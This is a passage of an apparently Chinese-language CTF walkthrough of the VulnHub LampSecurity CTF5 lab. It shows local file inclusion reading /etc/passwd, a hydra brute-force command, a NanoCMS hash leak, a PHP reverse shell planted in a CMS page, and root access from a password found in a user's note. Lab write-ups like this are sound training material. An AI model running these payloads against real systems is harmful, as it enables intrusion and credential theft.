+ /info.php?file<span class="token operator">=</span>http://blog.cirt.net/rfiinc.txt: Remote File Inclusion <span class="token punctuation">(</span>RFI<span class="token punctuation">)</span> from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2
+ /phpmyadmin/: phpMyAdmin directory found.
+ /phpmyadmin/Documentation.html: phpMyAdmin is <span class="token keyword">for</span> managing MySQL databases, and should be protected or limited to authorized hosts.
+ /phpmyadmin/README: phpMyAdmin is <span class="token keyword">for</span> managing MySQL databases, and should be protected or limited to authorized hosts. See: https://typo3.org/
+ /<span class="token comment" spellcheck="true">#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span>
+ 8908 requests: 0 error<span class="token punctuation">(</span>s<span class="token punctuation">)</span> and 26 item<span class="token punctuation">(</span>s<span class="token punctuation">)</span> reported on remote host
+ End Time:           2023-04-26 16:29:51 <span class="token punctuation">(</span>GMT8<span class="token punctuation">)</span> <span class="token punctuation">(</span>25 seconds<span class="token punctuation">)</span>
---------------------------------------------------------------------------
+ 1 host<span class="token punctuation">(</span>s<span class="token punctuation">)</span> tested
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="RFI（F）"><a href="#RFI（F）" class="headerlink" title="RFI（F）"></a>RFI（F）</h4><p>之前nikto中发现<code>/info.php?file=</code>可能存在远程文件包含，实际试了一下发现并不行。</p>
<h4 id="SQLi（F）"><a href="#SQLi（F）" class="headerlink" title="SQLi（F）"></a>SQLi（F）</h4><p>再看看sql注入，如果能直接拿到登录凭证那美滋滋。<br>先sqlmap扫一下<code>[http://192.168.56.139:80/events/?q=event%2Fical](http://192.168.56.139:80/events/?q=event%2Fical)</code>，发现没有注入点。<br>手动看看发现是下载一个文件。<br>再sqlmap扫一下<code>[http://192.168.56.139:80/?page=contact](http://192.168.56.139:80/?page=contact)</code>，还是没有注入点。</p>
<h4 id="LFI（F）"><a href="#LFI（F）" class="headerlink" title="LFI（F）"></a>LFI（F）</h4><p>直接访问发现报错，报错信息如下</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> curl <span class="token string">'http://192.168.56.139/?page=../../../../../../../etc/passwd'</span>
<span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"main"</span><span class="token operator">></span>

<span class="token operator">&lt;</span>b<span class="token operator">></span>Warning<span class="token operator">&lt;</span>/b<span class="token operator">></span>:  include_once<span class="token punctuation">(</span>inc/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd.php<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">'function.include-once'</span><span class="token operator">></span>function.include-once<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token punctuation">]</span>: failed to <span class="token function">open</span> stream: No such <span class="token function">file</span> or directory <span class="token keyword">in</span> <span class="token operator">&lt;</span>b<span class="token operator">></span>/var/www/html/index.php<span class="token operator">&lt;</span>/b<span class="token operator">></span> on line <span class="token operator">&lt;</span>b<span class="token operator">></span>6<span class="token operator">&lt;</span>/b<span class="token operator">></span>



<span class="token operator">&lt;</span>b<span class="token operator">></span>Warning<span class="token operator">&lt;</span>/b<span class="token operator">></span>:  include_once<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">'function.include'</span><span class="token operator">></span>function.include<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token punctuation">]</span>: Failed opening <span class="token string">'inc/../../../../../../../etc/passwd.php'</span> <span class="token keyword">for</span> inclusion <span class="token punctuation">(</span>include_path<span class="token operator">=</span><span class="token string">'.:/usr/share/pear:/usr/share/php'</span><span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>b<span class="token operator">></span>/var/www/html/index.php<span class="token operator">&lt;</span>/b<span class="token operator">></span> on line <span class="token operator">&lt;</span>b<span class="token operator">></span>6<span class="token operator">&lt;</span>/b<span class="token operator">></span>

<span class="token operator">&lt;</span>/div<span class="token operator">></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>一眼文件包含漏洞，由于后面有<code>.php</code>，我们之前看phpinfo页面发现此PHP版本存在0字符截断漏洞。直接截断。</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># http://192.168.56.139/?page=../../../../../../../etc/passwd%00</span>

root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin nscd:x:28:28:NSCD Daemon:/:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin rpm:x:37:37:RPM user:/var/lib/rpm:/sbin/nologin polkituser:x:87:87:PolicyKit:/:/sbin/nologin avahi:x:499:499:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin openvpn:x:498:497:OpenVPN:/etc/openvpn:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin torrent:x:497:496:BitTorrent Seed/Tracker:/var/spool/bittorrent:/sbin/nologin haldaemon:x:68:68:HAL daemon:/:/sbin/nologin gdm:x:42:42::/var/gdm:/sbin/nologin patrick:x:500:500:Patrick Fair:/home/patrick:/bin/bash jennifer:x:501:501:Jennifer Sea:/home/jennifer:/bin/bash andy:x:502:502:Andrew Carp:/home/andy:/bin/bash loren:x:503:503:Loren Felt:/home/loren:/bin/bash amy:x:504:504:Amy Pendelton:/home/amy:/bin/bash mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>可看到<code>/etc/passwd</code>内容，可惜看不到shadow的内容，想看看配置信息啥的无果。先暂时搁置这个漏洞。</p>
<h4 id="Samba（F）"><a href="#Samba（F）" class="headerlink" title="Samba（F）"></a>Samba（F）</h4><pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf5/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -p 445 --script<span class="token operator">=</span>smb-enum-shares.nse,smb-enum-users.nse 192.168.56.139
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> kali: 
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-04-26 16:54 CST
Nmap scan report <span class="token keyword">for</span> 192.168.56.139
Host is up <span class="token punctuation">(</span>0.00053s latency<span class="token punctuation">)</span>.

PORT    STATE SERVICE
445/tcp <span class="token function">open</span>  microsoft-ds
MAC Address: 00:0C:29:7D:00:15 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>

Host script results:
<span class="token operator">|</span> smb-enum-shares: 
<span class="token operator">|</span>   account_used: <span class="token operator">&lt;</span>blank<span class="token operator">></span>
<span class="token operator">|</span>   \\192.168.56.139\IPC$: 
<span class="token operator">|</span>     Type: STYPE_IPC_HIDDEN
<span class="token operator">|</span>     Comment: IPC Service <span class="token punctuation">(</span>Samba Server Version 3.0.26a-6.fc8<span class="token punctuation">)</span>
<span class="token operator">|</span>     Users: 1
<span class="token operator">|</span>     Max Users: <span class="token operator">&lt;</span>unlimited<span class="token operator">></span>
<span class="token operator">|</span>     Path: C:\tmp
<span class="token operator">|</span>_    Anonymous access: READ/WRITE
<span class="token operator">|</span> smb-enum-users: 
<span class="token operator">|</span>   LOCALHOST\amy <span class="token punctuation">(</span>RID: 2008<span class="token punctuation">)</span>
<span class="token operator">|</span>     Full name:   Amy Pendelton
<span class="token operator">|</span>     Flags:       Normal user account
<span class="token operator">|</span>   LOCALHOST\andy <span class="token punctuation">(</span>RID: 2004<span class="token punctuation">)</span>
<span class="token operator">|</span>     Full name:   Andrew Carp
<span class="token operator">|</span>     Flags:       Normal user account
<span class="token operator">|</span>   LOCALHOST\jennifer <span class="token punctuation">(</span>RID: 2002<span class="token punctuation">)</span>
<span class="token operator">|</span>     Full name:   Jennifer Sea
<span class="token operator">|</span>     Flags:       Normal user account
<span class="token operator">|</span>   LOCALHOST\loren <span class="token punctuation">(</span>RID: 2006<span class="token punctuation">)</span>
<span class="token operator">|</span>     Full name:   Loren Felt
<span class="token operator">|</span>     Flags:       Normal user account
<span class="token operator">|</span>   LOCALHOST\patrick <span class="token punctuation">(</span>RID: 2000<span class="token punctuation">)</span>
<span class="token operator">|</span>     Full name:   Patrick Fair
<span class="token operator">|</span>_    Flags:       Normal user account

Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 4.12 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看看我们的samba服务吧，扫出了各用户名以及共享的地址<br>再用smbmap扫一下</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf5/workSpace<span class="token punctuation">]</span>
└─$ smbmap -H 192.168.56.139                 
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> IP: 192.168.56.139:445      Name: unknown                                           
Disk        Permissions     Comment
----        -----------     -------
homes       NO ACCESS       Home Directories
IPC$        NO ACCESS       IPC Service <span class="token punctuation">(</span>Samba Server Version 3.0.26a-6.fc8<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得，都是NO ACCESS。寄</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Not use</span>
hydra -l andy -P /usr/share/wordlists/rockyou.txt 192.168.56.139 http-post-form <span class="token string">"/~andy/data/nanoadmin.php:SQMSESSID=b2pdpdkh3rlkvukqr0jbssur30; PHPSESSID=7rlrvoh72sto2t935mmr4l99e0; SESS100a7dde408e54bc0d12aead519a7cc5=i1u9c4qe9er2gu0r1ou19tqhj1
;user=^USER^&amp;pass=^PASS^:F=wrong Username or Password"</span>


Cookie: SQMSESSID<span class="token operator">=</span>b2pdpdkh3rlkvukqr0jbssur30<span class="token punctuation">;</span> PHPSESSID<span class="token operator">=</span>7rlrvoh72sto2t935mmr4l99e0<span class="token punctuation">;</span> SESS100a7dde408e54bc0d12aead519a7cc5<span class="token operator">=</span>i1u9c4qe9er2gu0r1ou19tqhj1
Upgrade-Insecure-Requests: 1
user<span class="token operator">=</span>1111<span class="token operator">&amp;</span>pass<span class="token operator">=</span>2222
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="NanoCMS（S）"><a href="#NanoCMS（S）" class="headerlink" title="NanoCMS（S）"></a>NanoCMS（S）</h4><p>在后台登录界面，我们可以发现cms是nanocms，在exp-db上查一下，发现只有一个已登录用户的RCE漏洞。<br>再在搜索引擎查一查<code>search in bing: nanocms exploit</code>，发现nanoCMS存在一个数据泄露漏洞。<br class='item-img' data-src='/pic/assets/1682583289658-c18c9cb0-6b33-48e5-9777-b7b302bd939c.png'><img src="/pic/assets/1682583289658-c18c9cb0-6b33-48e5-9777-b7b302bd939c.png" alt="query-nano-exp.png"><br>虽然不知道nanocms的版本，但是还是试试吧，死马当活马医。</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf5/workSpace<span class="token punctuation">]</span>
└─$ curl http://192.168.56.139/~andy/data/pagesdata.txt
a:12:<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;s:8:"homepage";s:1:"1";s:10:"links_cats";a:4:&amp;#123;s:7:"sidebar";a:2:&amp;#123;i:0;i:1;i:1;i:4;&amp;#125;s:11:"other-pages";a:0:&amp;#123;&amp;#125;s:14:"top-navigation";a:2:&amp;#123;i:0;s:1:"1";i:1;s:1:"4";&amp;#125;s:12:"Footer-Right";a:2:&amp;#123;i:0;s:1:"1";i:1;s:1:"4";&amp;#125;&amp;#125;s:5:"slugs";a:2:&amp;#123;i:1;s:4:"home";i:4;s:7:"contact";&amp;#125;s:6:"titles";a:2:&amp;#123;i:1;s:4:"Home";i:4;s:7:"Contact";&amp;#125;s:10:"slug_count";i:12;s:8:"settings";a:3:&amp;#123;s:19:"index-last-modified";i:1234513760;s:18:"def-template-areas";a:4:&amp;#123;i:0;s:12:"website name";i:2;s:14:"website slogan";i:3;s:16:"below navigation";i:4;s:16:"copyright notice";&amp;#125;s:18:"def-template-links";a:2:&amp;#123;i:0;s:14:"top-navigation";i:1;s:12:"Footer-Right";&amp;#125;&amp;#125;s:13:"active-tweaks";a:2:&amp;#123;i:0;s:7:"deutsch";i:1;s:19:"language-pack-tweak";&amp;#125;s:11:"lang-select";s:7:"english";s:6:"seourl";s:1:"0";s:8:"username";s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd";s:7:"version";s:4:"v_4f";&amp;#125;   </span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>发现竟然爆出了username和password。<br>直接把md5值的密码丢去破解。<br class='item-img' data-src='/pic/assets/1682583540033-065a0a22-68c7-42c3-bba1-77e26f8ef25a.png'><img src="/pic/assets/1682583540033-065a0a22-68c7-42c3-bba1-77e26f8ef25a.png" alt="md5pass-crack.png"><br>OK<br>登录后台<br class='item-img' data-src='/pic/assets/1682583559790-b3168777-a196-4145-b32e-8e66ac816743.png'><img src="/pic/assets/1682583559790-b3168777-a196-4145-b32e-8e66ac816743.png" alt="nano-admin-panel.png"><br>OK<br>四处找了找，发现可以编辑页面的地方，决定隐蔽点在contact页面插个反弹shell。<br class='item-img' data-src='/pic/assets/1682583574629-d7e63399-71cd-47c6-b8b1-e264bc15db61.png'><img src="/pic/assets/1682583574629-d7e63399-71cd-47c6-b8b1-e264bc15db61.png" alt="webshell-insert.png"></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/bin/bash -c '/bin/bash -i >&amp; /dev/tcp/192.168.56.132/8080 0>&amp;1'"</span><span class="token punctuation">)</span> <span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>成功获取shell。</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf5/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nc -lvp 443 
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 443 <span class="token punctuation">..</span>.
192.168.56.139: inverse host lookup failed: Host name lookup failure
connect to <span class="token punctuation">[</span>192.168.56.132<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span>192.168.56.139<span class="token punctuation">]</span> 54757
bash: no job control <span class="token keyword">in</span> this shell
bash-3.2$ <span class="token function">whoami</span>
apache
bash-3.2$ ip a
1: lo: <span class="token operator">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="token operator">></span> mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth1: <span class="token operator">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="token operator">></span> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:0c:29:7d:00:15 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.139/24 brd 192.168.56.255 scope global eth1
    inet6 fe80::20c:29ff:fe7d:15/64 scope <span class="token function">link</span> 
       valid_lft forever preferred_lft forever
bash-3.2$
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Priv-E"><a href="#Priv-E" class="headerlink" title="Priv E"></a>Priv E</h2><p><code>sudo -l</code> need password.</p>
<p><code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code><br>没有有价值的，at用了总是失败，其他没有啥能用的。</p>
<pre class="line-numbers language-bash"><code class="language-bash">bash-3.2$ <span class="token function">cat</span> /etc/crontab
SHELL<span class="token operator">=</span>/bin/bash
PATH<span class="token operator">=</span>/sbin:/bin:/usr/sbin:/usr/bin
MAILTO<span class="token operator">=</span>root
HOME<span class="token operator">=</span>/

<span class="token comment" spellcheck="true"># run-parts</span>
01 * * * * root run-parts /etc/cron.hourly
02 4 * * * root run-parts /etc/cron.daily
22 4 * * 0 root run-parts /etc/cron.weekly
42 4 1 * * root run-parts /etc/cron.monthly
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>一个个去定时任务文件夹里看了一遍，研究了下&#x2F;etc&#x2F;cron.daily里的一个定时任务，没发现可以利用的东西。</p>
<p>传一下lse.sh上去，执行后发现这个shell不支持颜色显示语法，可读性极差。。。<br>换成linpeas，发现可以正常显示颜色。还得是他。<br>可惜还是没有提供特别有用的信息，虽然此系统版本很低，很有可能可以内核提权，但是，太不稳定了，还是不试了。</p>
<p>看了下视频思路：</p>
<blockquote>
<p>There <strong>so many</strong> user in the system that maybe some of them would left credentials in their files. So why not take a try?<br>多用户环境下，保不齐会有带路党，反正试试不吃亏。</p>
</blockquote>
<p>所以我们递归忽略大小写搜一下<code>/home</code>下的文件里的pass字段</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># -R recursion -i ignore Cap</span>
<span class="token function">grep</span> -R -i pass /home/* 2<span class="token operator">></span>/dev/null
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash"><code class="language-bash">/home/andy/public_html/data/admin-design/loginform.php:    <span class="token operator">&lt;</span>tr<span class="token operator">></span><span class="token operator">&lt;</span>td<span class="token operator">></span><span class="token operator">&lt;</span>?php _lt<span class="token punctuation">(</span><span class="token string">'Password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span><span class="token operator">&lt;</span>/td<span class="token operator">></span><span class="token operator">&lt;</span>td<span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">'password'</span> name<span class="token operator">=</span><span class="token string">'pass'</span><span class="token operator">></span><span class="token operator">&lt;</span>/td<span class="token operator">></span><span class="token operator">&lt;</span>/tr<span class="token operator">></span>
/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  <span class="token operator">&lt;</span>title<span class="token operator">></span>Root password<span class="token operator">&lt;</span>/title<span class="token operator">></span>
/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  <span class="token operator">&lt;</span>text xml:space<span class="token operator">=</span><span class="token string">"preserve"</span><span class="token operator">></span><span class="token operator">&lt;</span>note-content version<span class="token operator">=</span><span class="token string">"0.1"</span><span class="token operator">></span>Root password
/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:Root password
/home/patrick/.tomboy.log:12/5/2012 7:24:46 AM <span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span>: Renaming note from New Note 3 to Root password
/home/patrick/.tomboy.log:12/5/2012 7:24:56 AM <span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span>: Saving <span class="token string">'Root password'</span><span class="token punctuation">..</span>.
/home/patrick/.tomboy.log:12/5/2012 7:25:03 AM <span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span>: Saving <span class="token string">'Root password'</span><span class="token punctuation">..</span>.
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-xml"><code class="language-xml"># cat /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note
<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0.2<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>link</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://beatniksoftware.com/tomboy/link<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://beatniksoftware.com/tomboy/size<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://beatniksoftware.com/tomboy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Root password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span> <span class="token attr-name"><span class="token namespace">xml:</span>space</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>preserve<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note-content</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0.1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Root password

Root password

50$cent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note-content</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>last-change-date</span><span class="token punctuation">></span></span>2012-12-05T07:24:52.7364970-05:00<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>last-change-date</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>create-date</span><span class="token punctuation">></span></span>2012-12-05T07:24:34.3731780-05:00<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>create-date</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cursor-position</span><span class="token punctuation">></span></span>15<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cursor-position</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>width</span><span class="token punctuation">></span></span>450<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>width</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>height</span><span class="token punctuation">></span></span>360<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>height</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>y</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>y</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>open-on-startup</span><span class="token punctuation">></span></span>False<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>open-on-startup</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>密码发现，存的还是root密码，离谱。</p>
<pre class="line-numbers language-bash"><code class="language-bash">ash-3.2$ <span class="token function">su</span>
<span class="token function">su</span>
Password: 50<span class="token variable">$cent</span>

<span class="token punctuation">[</span>root@localhost bin<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># whoami</span>
<span class="token function">whoami</span>
root
<span class="token punctuation">[</span>root@localhost bin<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ip a</span>
ip a
1: lo: <span class="token operator">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="token operator">></span> mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth1: <span class="token operator">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="token operator">></span> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:0c:29:7d:00:15 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.139/24 brd 192.168.56.255 scope global eth1
    inet6 fe80::20c:29ff:fe7d:15/64 scope <span class="token function">link</span> 
       valid_lft forever preferred_lft forever
<span class="token punctuation">[</span>root@localhost bin<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>搞定。</p>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>实际上测试SQLi的时候还是不够细，光想着url里的参数了。老惦记那B<code>GET</code>方法干吗。真得想想<code>POST</code>的事吧。<br>在<code>192.168.56.139/list/</code>页面中，4个form输入框存在SQLi漏洞，加个<code>&#39;</code>试出来了。</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulnhub/LampSecurity/ctf5/workSpace<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> sqlmap -u http://192.168.56.139/list/ --data <span class="token string">'name=1&amp;email=&amp;phone=&amp;org='</span> 
        ___
       __H__                                                                                    
 ___ ___<span class="token punctuation">[</span><span class="token string">"]_____ ___ ___  &amp;#123;1.7.2#stable&amp;#125;                                                        
|_ -| . ["</span><span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token keyword">.</span><span class="token string">'| . |                                                                       
|___|_  [)]_|_|_|__,|  _|                                                                       
      |_|V...       |_|   https://sqlmap.org                                                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ 15:16:57 /2023-04-27/

<span class="token punctuation">[</span>15:16:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> provided value <span class="token keyword">for</span> parameter <span class="token string">'email'</span> is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
